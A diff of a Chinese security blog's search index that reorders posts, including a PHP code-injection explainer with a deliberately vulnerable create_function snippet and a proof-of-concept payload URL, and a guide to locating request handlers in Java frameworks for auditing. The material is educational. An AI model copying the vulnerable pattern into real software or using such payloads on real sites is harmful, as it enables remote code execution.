@@ -381,46 +381,6 @@
       </tags>
   </entry>
   <entry>
-    <title>PHP代码执行</title>
-    <url>/2025/04/11/PHP%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/</url>
-    <content><![CDATA[<h1 id="PHP-CODE-INJECTION"><a href="#PHP-CODE-INJECTION" class="headerlink" title="PHP CODE INJECTION"></a>PHP CODE INJECTION</h1><p>可以注入PHP代码直接执行的漏洞</p>
-<p>一般都是后台使用了eval 函数，将我们的输入直接作为eval函数的参数，从而是的恶意的命令被执行</p>
-<h2 id="create-function"><a href="#create-function" class="headerlink" title="create_function"></a>create_function</h2><p>create会创建一个匿名函数，第一个参数是传入的参数，第二个参数是函数体</p>
-<p><code>create_function(args,code)</code> 返回回个函数名字符串</p>
-<p>如</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$newfunc</span> = <span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;$a,$b&#x27;</span>, <span class="string">&#x27;return &quot;ln($a) + ln($b) = &quot; . log($a * $b);</span></span><br></pre></td></tr></table></figure>
-
-<p>函数的执行过程</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">newfunc</span>(<span class="params"></span>)</span>&#123;    </span><br><span class="line">	<span class="keyword">return</span> <span class="string">&quot;ln(<span class="subst">$a</span>) + ln(<span class="subst">$b</span>) = &quot;</span> . <span class="title function_ invoke__">log</span>(<span class="variable">$a</span> * <span class="variable">$b</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>**案例一：**漏洞代码</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">	<span class="variable">$sort_by</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;sort_by&#x27;</span>];</span><br><span class="line">	<span class="variable">$sorter</span> = <span class="string">&#x27;strnatcasecmp&#x27;</span>;</span><br><span class="line">	<span class="variable">$databases</span>=<span class="keyword">array</span>(<span class="string">&#x27;1234&#x27;</span>,<span class="string">&#x27;4321&#x27;</span>);</span><br><span class="line">	<span class="variable">$sort_function</span> = <span class="string">&#x27; return 1 * &#x27;</span> . <span class="variable">$sorter</span> . <span class="string">&#x27;($a[&quot;&#x27;</span> . <span class="variable">$sort_by</span> . <span class="string">&#x27;&quot;], $b[&quot;&#x27;</span> . <span class="variable">$sort_by</span> . <span class="string">&#x27;&quot;]);&#x27;</span>;</span><br><span class="line">	<span class="title function_ invoke__">usort</span>(<span class="variable">$databases</span>, <span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;$a, $b&#x27;</span>, <span class="variable">$sort_function</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>payload</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//localhost/test1.php?sort_by=%27%22]);&#125;phpinfo();/*</span></span><br></pre></td></tr></table></figure>
-
-<p>还原执行过程</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sort_function</span> = <span class="string">&#x27; return 1 * &#x27;</span> . <span class="variable">$sorter</span> . <span class="string">&#x27;($a[&quot;&#x27;</span> . <span class="variable">$sort_by</span> <span class="string">&#x27;&quot;]);&#125;phpinfo();/*</span></span><br></pre></td></tr></table></figure>
-
-<p>匿名函数执行</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">niming</span>(<span class="params"><span class="variable">$a</span>,<span class="variable">$b</span></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">1</span> * <span class="string">&#x27; . $sorter . &#x27;</span>(<span class="variable">$a</span>[<span class="string">&quot;&#x27; . <span class="subst">$sort_by</span> &#x27;&quot;</span>]);&#125;<span class="title function_ invoke__">phpinfo</span>();<span class="comment">/*	</span></span><br><span class="line"><span class="comment">&#125;</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="call-user-func"><a href="#call-user-func" class="headerlink" title="call_user_func"></a>call_user_func</h2><p><code>call_user_func(yourfunc,yourargs)</code> &#x2F;&#x2F;将参数传入函数，可传多个</p>
-<h2 id="call-user-func-array"><a href="#call-user-func-array" class="headerlink" title="call_user_func_array"></a>call_user_func_array</h2><p><code>call_user_func_array(yourfunc,yourargsarray)</code> &#x2F;&#x2F;将索引数组的元素作为函数的参数</p>
-<h2 id="assert"><a href="#assert" class="headerlink" title="assert"></a>assert</h2><h2 id="eval"><a href="#eval" class="headerlink" title="eval"></a>eval</h2><h2 id="system"><a href="#system" class="headerlink" title="system"></a>system</h2><p>array_map</p>
-<p>array_filter</p>
-<p>array_walk</p>
-]]></content>
-      <categories>
-        <category>漏洞原理</category>
-      </categories>
-      <tags>
-        <tag>PHP</tag>
-        <tag>代码执行</tag>
-        <tag>漏洞原理</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>PHP命令执行</title>
     <url>/2025/04/11/PHP%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
     <content><![CDATA[<h1 id="RCE漏洞"><a href="#RCE漏洞" class="headerlink" title="RCE漏洞"></a>RCE漏洞</h1><p>服务器提供了执行有限命令的权限，但是没有对用户上传的参数做严格过滤，于是可通过一些手段执行多条命令</p>
@@ -478,8 +438,48 @@
       </categories>
       <tags>
         <tag>PHP</tag>
-        <tag>漏洞原理</tag>
         <tag>命令执行</tag>
+        <tag>漏洞原理</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>PHP代码执行</title>
+    <url>/2025/04/11/PHP%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/</url>
+    <content><![CDATA[<h1 id="PHP-CODE-INJECTION"><a href="#PHP-CODE-INJECTION" class="headerlink" title="PHP CODE INJECTION"></a>PHP CODE INJECTION</h1><p>可以注入PHP代码直接执行的漏洞</p>
+<p>一般都是后台使用了eval 函数，将我们的输入直接作为eval函数的参数，从而是的恶意的命令被执行</p>
+<h2 id="create-function"><a href="#create-function" class="headerlink" title="create_function"></a>create_function</h2><p>create会创建一个匿名函数，第一个参数是传入的参数，第二个参数是函数体</p>
+<p><code>create_function(args,code)</code> 返回回个函数名字符串</p>
+<p>如</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$newfunc</span> = <span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;$a,$b&#x27;</span>, <span class="string">&#x27;return &quot;ln($a) + ln($b) = &quot; . log($a * $b);</span></span><br></pre></td></tr></table></figure>
+
+<p>函数的执行过程</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">newfunc</span>(<span class="params"></span>)</span>&#123;    </span><br><span class="line">	<span class="keyword">return</span> <span class="string">&quot;ln(<span class="subst">$a</span>) + ln(<span class="subst">$b</span>) = &quot;</span> . <span class="title function_ invoke__">log</span>(<span class="variable">$a</span> * <span class="variable">$b</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>**案例一：**漏洞代码</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">	<span class="variable">$sort_by</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;sort_by&#x27;</span>];</span><br><span class="line">	<span class="variable">$sorter</span> = <span class="string">&#x27;strnatcasecmp&#x27;</span>;</span><br><span class="line">	<span class="variable">$databases</span>=<span class="keyword">array</span>(<span class="string">&#x27;1234&#x27;</span>,<span class="string">&#x27;4321&#x27;</span>);</span><br><span class="line">	<span class="variable">$sort_function</span> = <span class="string">&#x27; return 1 * &#x27;</span> . <span class="variable">$sorter</span> . <span class="string">&#x27;($a[&quot;&#x27;</span> . <span class="variable">$sort_by</span> . <span class="string">&#x27;&quot;], $b[&quot;&#x27;</span> . <span class="variable">$sort_by</span> . <span class="string">&#x27;&quot;]);&#x27;</span>;</span><br><span class="line">	<span class="title function_ invoke__">usort</span>(<span class="variable">$databases</span>, <span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;$a, $b&#x27;</span>, <span class="variable">$sort_function</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>payload</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//localhost/test1.php?sort_by=%27%22]);&#125;phpinfo();/*</span></span><br></pre></td></tr></table></figure>
+
+<p>还原执行过程</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sort_function</span> = <span class="string">&#x27; return 1 * &#x27;</span> . <span class="variable">$sorter</span> . <span class="string">&#x27;($a[&quot;&#x27;</span> . <span class="variable">$sort_by</span> <span class="string">&#x27;&quot;]);&#125;phpinfo();/*</span></span><br></pre></td></tr></table></figure>
+
+<p>匿名函数执行</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">niming</span>(<span class="params"><span class="variable">$a</span>,<span class="variable">$b</span></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">1</span> * <span class="string">&#x27; . $sorter . &#x27;</span>(<span class="variable">$a</span>[<span class="string">&quot;&#x27; . <span class="subst">$sort_by</span> &#x27;&quot;</span>]);&#125;<span class="title function_ invoke__">phpinfo</span>();<span class="comment">/*	</span></span><br><span class="line"><span class="comment">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="call-user-func"><a href="#call-user-func" class="headerlink" title="call_user_func"></a>call_user_func</h2><p><code>call_user_func(yourfunc,yourargs)</code> &#x2F;&#x2F;将参数传入函数，可传多个</p>
+<h2 id="call-user-func-array"><a href="#call-user-func-array" class="headerlink" title="call_user_func_array"></a>call_user_func_array</h2><p><code>call_user_func_array(yourfunc,yourargsarray)</code> &#x2F;&#x2F;将索引数组的元素作为函数的参数</p>
+<h2 id="assert"><a href="#assert" class="headerlink" title="assert"></a>assert</h2><h2 id="eval"><a href="#eval" class="headerlink" title="eval"></a>eval</h2><h2 id="system"><a href="#system" class="headerlink" title="system"></a>system</h2><p>array_map</p>
+<p>array_filter</p>
+<p>array_walk</p>
+]]></content>
+      <categories>
+        <category>漏洞原理</category>
+      </categories>
+      <tags>
+        <tag>PHP</tag>
+        <tag>漏洞原理</tag>
+        <tag>代码执行</tag>
       </tags>
   </entry>
   <entry>
@@ -828,6 +828,42 @@
       </tags>
   </entry>
   <entry>
+    <title>JAVA生态常见架构介绍、配置与逻辑定位方法</title>
+    <url>/2025/04/10/JAVA%E7%94%9F%E6%80%81%E5%B8%B8%E8%A7%81%E6%9E%B6%E6%9E%84%E4%BB%8B%E7%BB%8D%E3%80%81%E9%85%8D%E7%BD%AE%E4%B8%8E%E9%80%BB%E8%BE%91%E5%AE%9A%E4%BD%8D%E6%96%B9%E6%B3%95/</url>
+    <content><![CDATA[<p>不知道你在挖洞过程中是否碰到过这样一个问题，资源下载到了，调试环境也搞定了却迟迟找不到合适的地方下断点进行调试，这时候你会选择怎么办？<br>是去寻找启动类一行一行代码查看直到找到URI的处理函数，还是快准狠地定位到关键点马上出洞？我想不会有人想要选择第一种方法，<br>但按照第一种方法不断地熟悉不同的框架的过程却是一个挖洞小白向大佬进化的过程，我们往往需要在这个过程中不断地积累足够的经验来熟悉常见的技术与框架，<br>这几乎是每一个大佬成长路上必须要走的路。毫无疑问，这种曲折的过程最能增长人们的能力，不过这个过程往往是痛苦且枯燥的，在挖洞过程中，时间紧任务重的情况下，<br>我们往往在这个过程中浪费了大量的时间与精力，所以我给大家简单总结了一下我们应该如何去找到一些常见框架进行资源处理与存放、配置存放与解析规则的方法。</p>
+<span id="more"></span>
+
+<h1 id="jetty"><a href="#jetty" class="headerlink" title="jetty"></a>jetty</h1><p>与<code>tomcat</code>一样，<code>jetty</code>也是一个<code>jsp</code>与<code>servlet</code>的容器，不过相比<code>tomcat</code>，其功能更加精简，整个程序的构建逻辑也与<code>tomcat</code>也有较大的差异，<br>不过既然是<code>servlet</code>容器那么其将遵循与<code>tomcat</code>一样的servlet规范，如配置在<code>web.xml</code>中的<code>servlet-mapping</code>与<code>filter-mapping</code>等。<br>对于漏洞挖掘来讲，其并没有太过独特的地方，我们重点关注的也就是web.xml中的配置信息，然后找到对应的请求处理方法进行审计即可。</p>
+<h1 id="struts2"><a href="#struts2" class="headerlink" title="struts2"></a>struts2</h1><p>在<code>spring mvc</code>火起来前，<code>struts</code>就是比较流行的<code>MVC</code>框架了，与<code>spring mvc</code>类似，<code>struts</code>也是采用类似前端控制器的方式来进行请求的分发，<br>不过<code>struts2</code>是通过<code>filter(StrutsPrepareAndExecuteFilter)</code>的方式进行分发，而spring是通过<code>servlet</code>，两者没有本质的区别。</p>
+<p><code>struts2</code>的请求处理方法与<code>spring</code>中的<code>controller</code>不同，在<code>struts</code>中其被称为<code>Action</code>，每个<code>Action</code>负责一个请求的处理，这些<code>Action</code>类默认使用<code>execute</code>方法进行请求处理，<br>不过也可以在配置文件中通过通过<code>action</code>标签属性<code>method</code>进行指定。</p>
+<p><code>struts2</code>的配置文件名为<code>struts.xml</code>，在实践中<code>struts</code>往往作为一个入口，具体的<code>Action</code>配置注册通过<code>include</code>的方式在其他配置文件中实现，<br>一般相似功能的<code>action</code>注册在一个文件中，如与登录相关的<code>action</code>可以放在一个文件中再将该文件包含到<code>struts.xml</code>中。</p>
+<p><code>struts2 action</code>是被<code>package</code>管理的，每个<code>package</code>标签下往往有多个<code>action</code>标签，每个<code>action</code>标签可以处理一个或多个请求，具体通过对标签属性<code>name</code>使用通配符的方式进行，<br>标签属性<code>class</code>指定<code>action</code>的处理类。<code>action</code>标签下的子标签<code>result</code>能够根据请求处理方法返回的字符串加载不同的资源进行视图渲染来进行响应。</p>
+<p>如：</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">struts</span> <span class="keyword">PUBLIC</span></span></span><br><span class="line"><span class="meta"><span class="string">&quot;-//Apache Software Foundation//DTD Struts Configuration 2.3//EN&quot;</span></span></span><br><span class="line"><span class="meta"><span class="string">&quot;http://struts.apache.org/dtds/struts-2.3.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">struts</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">package</span> <span class="attr">name</span>=<span class="string">&quot;login&quot;</span> <span class="attr">extends</span>=<span class="string">&quot;struts-default&quot;</span> <span class="attr">namespace</span>=<span class="string">&quot;/&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">action</span> <span class="attr">name</span>=<span class="string">&quot;*loginAction&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.example.www.LoginAction&quot;</span> <span class="attr">method</span>=<span class="string">&quot;&#123;1&#125;&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">&quot;success&quot;</span>&gt;</span>/index.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">package</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">struts</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>上例注册的<code>action</code>将会匹配所有以<code>loginAction</code>结尾的请求，并将请求交到<code>LoginAction</code>类进行处理，调用的方法是被<code>name</code>属性通配符匹配到的字符串同名的方法。<br>方法调用成功后返回<code>success</code>将加载<code>index.jsp</code>渲染响应给客户端。</p>
+<h1 id="spring-boot"><a href="#spring-boot" class="headerlink" title="spring boot"></a>spring boot</h1><p><code>spring boot</code>可能实在没有什么值得多说的，因为大家都太熟了，一个严格遵循<code>MVC</code>规范开发的程序，挖洞的标准步骤可能就是先在<code>web.xml</code>中查看配置看看<code>filter</code>有哪些 <code>servlet</code>有哪些，<br>然后去瞅瞅对应的<code>servlet</code>与<code>filter</code>的功能，能挖到洞就皆大欢喜，挖不倒就拉倒。可能这个流程太过标准我们往往忽视了一些其他的细节。使用<code>spring boot</code>单独打包的程序可能这些配置的位置很好找，<br>但一个大型应用动辄就是几百个<code>jar</code>包，这些不同的功能可能被拆开打包到不同的<code>jar</code>包，这时候是不是就抓瞎了？难道要一个一个地去点开看？当然没必要。</p>
+<p>首先，我们还是程序性得确定一下<code>spring boot</code>打包的<code>jar</code>包的结构，其与其他标准<code>jar</code>包略有差异，除了标准的<code>meta-inf</code>文件夹存放一些元信息以外，<br>还多了一个<code>boot-inf</code>的文件夹，这个<code>boot-inf</code>文件夹下的内容才是我们真正的启动类，在<code>meta-inf</code>文件夹下有个<code>MANIFEST.MF</code>文件，我们在这个文件中找到两个属性<code>Main-Class</code> 与 <code>Start-Class</code>，<br>其中<code>Main-Class</code>指定的就是<code>spring boot</code>的启动类，而<code>Start-Class</code>指定的就是我们编写的启动类。</p>
+<p>言归正传，我们重点是在庞杂的<code>jar</code>包中找到真正存放请求处理类的<code>jar</code>包，那么如何快速定位呢？我们知道<code>Spring Web</code>是通过前端控制器<code>DispatcherServlet</code>来进行请求的分发的，<br>在<code>DispatcherServlet</code>中方法<code>doDispatch</code>负责具体的分发逻辑，其中<code>DispatcherServlet this</code>对象的<code>handlerMappings</code> 属性存放的就是所有的注册的所有请求的处理对象，<br>当用户请求到来时将从这个<code>map</code>中取得对应的<code>handlerMapping</code>调用对应的方法对请求进行处理，故我们只需要遍历<code>handlerMappings</code>就可以找到<code>controlle</code>所在的位置了。具体的操作可能不太方便描述，<br>我们只需要逐级展开该对象获取器属性，然后找到带<code>controller</code>字样的属性然后鼠标右键选择<code>jump to type source</code>就可以跳转到类型的定义为止。当然我讲的这些都是在调试环境下进行的。<br><img src="/2025/04/10/JAVA%E7%94%9F%E6%80%81%E5%B8%B8%E8%A7%81%E6%9E%B6%E6%9E%84%E4%BB%8B%E7%BB%8D%E3%80%81%E9%85%8D%E7%BD%AE%E4%B8%8E%E9%80%BB%E8%BE%91%E5%AE%9A%E4%BD%8D%E6%96%B9%E6%B3%95/640.webp" referrerpolicy="no-referrer"></p>
+<h1 id="axis2"><a href="#axis2" class="headerlink" title="axis2"></a>axis2</h1><p>国内可能过分追求<code>spring</code>生态相关的东西，而对其它的技术运用不是特别广泛。我觉得<code>axis2</code>就算是一个，在国外的应用中你经常就能看到他们的身影，而在国内却很少见，<br>国内<code>java</code>程序员的传统艺能就是<code>spring framework    spring mvc spring boot   spring cloud spring security</code> 等。</p>
+<p><code>axis2</code>是<code>apache</code>开源的一个流行的<code>webservice</code>引擎，其可以方便地将<code>java</code>类发布为<code>service</code>，用户可以很容易地通过<code>http</code>请求调用到<code>java</code>类中定义的方法。</p>
+<p><code>axis2</code>通过<code>soap</code>协议来进行数据传输，发布一个<code>service</code>只需要编写一个<code>java</code>类，然后使用工具生成一个<code>wsdl</code>文件即可，一般在黑盒情况下要了解<code>service</code>可供使用的方法，<br>只需要在需要访问的<code>service</code>路径后加上参数<code>?wsdl</code>即可，当然这需要你能够读懂<code>wsdl</code>文件并且能够根据其构造出来对应的<code>soap</code>请求。</p>
+<p>嵌入式的<code>axis2</code>安装也是通过在<code>web.xml</code>中注册<code>servlet</code>实现的，寻找相关关键字就可以了，不过也没什么必要这里注册的内容只是告诉容器去解析<code>axis</code>而已，<br>具体与服务相关的东西还是要能够精准定位到<code>porttype</code>类与具体的<code>opration</code>才行，当然我们可以以<code>web.xml</code>中注册的<code>servlet</code>为突破口，找到对应的类打断点逐步调试也能找到对应的<code>service</code>类，<br>不过这需要你有足够的经验，能够根据方法名猜到其大致的功能以避免不必要的弯路。</p>
+<h1 id="grpc"><a href="#grpc" class="headerlink" title="grpc"></a>grpc</h1><p><code>rpc</code>与<code>restful</code>一样都是一套与信息交换有关的规范，用户往往接触到的是<code>restful</code>风格的<code>api</code>，而隐藏在<code>restful</code>后台与微服务，过程调用等相关的规范则往往是<code>rpc</code>。<br><code>grpc</code>是<code>google</code>的一套<code>rpc</code>规范，其采用<code>http/2</code>的方式进行信息交换，众所周知相比于<code>http/1.x http/2</code>采用字节流的方式发送数据，融合了多路复用、头部压缩等多种新兴技术具备更快的速度与可靠性。</p>
+<p>要实现一个<code>grpc</code>服务，首先我们需要按照<code>protobuf</code>的格式定义的<code>IDL</code>，即一个<code>.proto</code>后缀的文件，然后根据该文件使用工具编译生成与客户端请求处理相关的<code>stub</code>类，<br>以及与服务端方法定义相关的<code>ImplBase</code>类。我们通过实现<code>ImplBase</code>类通过覆写其方法类实现我们自己对外暴露的方法逻辑，然后客户端通过调用stub类同名方法来实现远程方法调用。</p>
+<p>当<code>grpc</code>与<code>spring boot</code>结合的时候对我们挖洞人来说往往是不友好的，<code>spring</code>通过注解进行自动装配的思想对于开发人员来说可能很方便，但对审计人员来说可真是难受，特别是分开打包+很多<code>jar</code>的情况。</p>
+]]></content>
+      <categories>
+        <category>安全技术</category>
+      </categories>
+      <tags>
+        <tag>网络安全</tag>
+        <tag>Java</tag>
+        <tag>jetty</tag>
+        <tag>axis2</tag>
+        <tag>struts2</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Hutool JSONUtil拒绝服务漏洞（CVE-2022-45690 CVE-2022-45689）</title>
     <url>/2025/04/10/Hutool-JSONUtil%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E-CVE-2022-45690-CVE-2022-45689/</url>
     <content><![CDATA[<h1 id="Hutool-JSONUtil拒绝服务漏洞（CVE-2022-45690-CVE-2022-45689）"><a href="#Hutool-JSONUtil拒绝服务漏洞（CVE-2022-45690-CVE-2022-45689）" class="headerlink" title="Hutool JSONUtil拒绝服务漏洞（CVE-2022-45690 CVE-2022-45689）"></a>Hutool JSONUtil拒绝服务漏洞（CVE-2022-45690 CVE-2022-45689）</h1><h2 id="产品介绍"><a href="#产品介绍" class="headerlink" title="产品介绍"></a>产品介绍</h2><p><code>Hutool</code>是一个功能丰富且易用的<strong>Java工具库</strong>，通过诸多实用工具类的使用，旨在帮助开发者快速、便捷地完成各类开发任务。 这些封装的工具涵盖了字符串、数字、集合、编码、日期、文件、IO、加密、数据库JDBC、JSON、HTTP客户端等一系列操作， 可以满足各种不同的开发需求。</p>
@@ -895,42 +931,6 @@
         <tag>CVE-2022-45690</tag>
         <tag>CVE-2022-45689</tag>
         <tag>DoS</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>JAVA生态常见架构介绍、配置与逻辑定位方法</title>
-    <url>/2025/04/10/JAVA%E7%94%9F%E6%80%81%E5%B8%B8%E8%A7%81%E6%9E%B6%E6%9E%84%E4%BB%8B%E7%BB%8D%E3%80%81%E9%85%8D%E7%BD%AE%E4%B8%8E%E9%80%BB%E8%BE%91%E5%AE%9A%E4%BD%8D%E6%96%B9%E6%B3%95/</url>
-    <content><![CDATA[<p>不知道你在挖洞过程中是否碰到过这样一个问题，资源下载到了，调试环境也搞定了却迟迟找不到合适的地方下断点进行调试，这时候你会选择怎么办？<br>是去寻找启动类一行一行代码查看直到找到URI的处理函数，还是快准狠地定位到关键点马上出洞？我想不会有人想要选择第一种方法，<br>但按照第一种方法不断地熟悉不同的框架的过程却是一个挖洞小白向大佬进化的过程，我们往往需要在这个过程中不断地积累足够的经验来熟悉常见的技术与框架，<br>这几乎是每一个大佬成长路上必须要走的路。毫无疑问，这种曲折的过程最能增长人们的能力，不过这个过程往往是痛苦且枯燥的，在挖洞过程中，时间紧任务重的情况下，<br>我们往往在这个过程中浪费了大量的时间与精力，所以我给大家简单总结了一下我们应该如何去找到一些常见框架进行资源处理与存放、配置存放与解析规则的方法。</p>
-<span id="more"></span>
-
-<h1 id="jetty"><a href="#jetty" class="headerlink" title="jetty"></a>jetty</h1><p>与<code>tomcat</code>一样，<code>jetty</code>也是一个<code>jsp</code>与<code>servlet</code>的容器，不过相比<code>tomcat</code>，其功能更加精简，整个程序的构建逻辑也与<code>tomcat</code>也有较大的差异，<br>不过既然是<code>servlet</code>容器那么其将遵循与<code>tomcat</code>一样的servlet规范，如配置在<code>web.xml</code>中的<code>servlet-mapping</code>与<code>filter-mapping</code>等。<br>对于漏洞挖掘来讲，其并没有太过独特的地方，我们重点关注的也就是web.xml中的配置信息，然后找到对应的请求处理方法进行审计即可。</p>
-<h1 id="struts2"><a href="#struts2" class="headerlink" title="struts2"></a>struts2</h1><p>在<code>spring mvc</code>火起来前，<code>struts</code>就是比较流行的<code>MVC</code>框架了，与<code>spring mvc</code>类似，<code>struts</code>也是采用类似前端控制器的方式来进行请求的分发，<br>不过<code>struts2</code>是通过<code>filter(StrutsPrepareAndExecuteFilter)</code>的方式进行分发，而spring是通过<code>servlet</code>，两者没有本质的区别。</p>
-<p><code>struts2</code>的请求处理方法与<code>spring</code>中的<code>controller</code>不同，在<code>struts</code>中其被称为<code>Action</code>，每个<code>Action</code>负责一个请求的处理，这些<code>Action</code>类默认使用<code>execute</code>方法进行请求处理，<br>不过也可以在配置文件中通过通过<code>action</code>标签属性<code>method</code>进行指定。</p>
-<p><code>struts2</code>的配置文件名为<code>struts.xml</code>，在实践中<code>struts</code>往往作为一个入口，具体的<code>Action</code>配置注册通过<code>include</code>的方式在其他配置文件中实现，<br>一般相似功能的<code>action</code>注册在一个文件中，如与登录相关的<code>action</code>可以放在一个文件中再将该文件包含到<code>struts.xml</code>中。</p>
-<p><code>struts2 action</code>是被<code>package</code>管理的，每个<code>package</code>标签下往往有多个<code>action</code>标签，每个<code>action</code>标签可以处理一个或多个请求，具体通过对标签属性<code>name</code>使用通配符的方式进行，<br>标签属性<code>class</code>指定<code>action</code>的处理类。<code>action</code>标签下的子标签<code>result</code>能够根据请求处理方法返回的字符串加载不同的资源进行视图渲染来进行响应。</p>
-<p>如：</p>
-<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">struts</span> <span class="keyword">PUBLIC</span></span></span><br><span class="line"><span class="meta"><span class="string">&quot;-//Apache Software Foundation//DTD Struts Configuration 2.3//EN&quot;</span></span></span><br><span class="line"><span class="meta"><span class="string">&quot;http://struts.apache.org/dtds/struts-2.3.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">struts</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">package</span> <span class="attr">name</span>=<span class="string">&quot;login&quot;</span> <span class="attr">extends</span>=<span class="string">&quot;struts-default&quot;</span> <span class="attr">namespace</span>=<span class="string">&quot;/&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">action</span> <span class="attr">name</span>=<span class="string">&quot;*loginAction&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.example.www.LoginAction&quot;</span> <span class="attr">method</span>=<span class="string">&quot;&#123;1&#125;&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">&quot;success&quot;</span>&gt;</span>/index.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">package</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">struts</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p>上例注册的<code>action</code>将会匹配所有以<code>loginAction</code>结尾的请求，并将请求交到<code>LoginAction</code>类进行处理，调用的方法是被<code>name</code>属性通配符匹配到的字符串同名的方法。<br>方法调用成功后返回<code>success</code>将加载<code>index.jsp</code>渲染响应给客户端。</p>
-<h1 id="spring-boot"><a href="#spring-boot" class="headerlink" title="spring boot"></a>spring boot</h1><p><code>spring boot</code>可能实在没有什么值得多说的，因为大家都太熟了，一个严格遵循<code>MVC</code>规范开发的程序，挖洞的标准步骤可能就是先在<code>web.xml</code>中查看配置看看<code>filter</code>有哪些 <code>servlet</code>有哪些，<br>然后去瞅瞅对应的<code>servlet</code>与<code>filter</code>的功能，能挖到洞就皆大欢喜，挖不倒就拉倒。可能这个流程太过标准我们往往忽视了一些其他的细节。使用<code>spring boot</code>单独打包的程序可能这些配置的位置很好找，<br>但一个大型应用动辄就是几百个<code>jar</code>包，这些不同的功能可能被拆开打包到不同的<code>jar</code>包，这时候是不是就抓瞎了？难道要一个一个地去点开看？当然没必要。</p>
-<p>首先，我们还是程序性得确定一下<code>spring boot</code>打包的<code>jar</code>包的结构，其与其他标准<code>jar</code>包略有差异，除了标准的<code>meta-inf</code>文件夹存放一些元信息以外，<br>还多了一个<code>boot-inf</code>的文件夹，这个<code>boot-inf</code>文件夹下的内容才是我们真正的启动类，在<code>meta-inf</code>文件夹下有个<code>MANIFEST.MF</code>文件，我们在这个文件中找到两个属性<code>Main-Class</code> 与 <code>Start-Class</code>，<br>其中<code>Main-Class</code>指定的就是<code>spring boot</code>的启动类，而<code>Start-Class</code>指定的就是我们编写的启动类。</p>
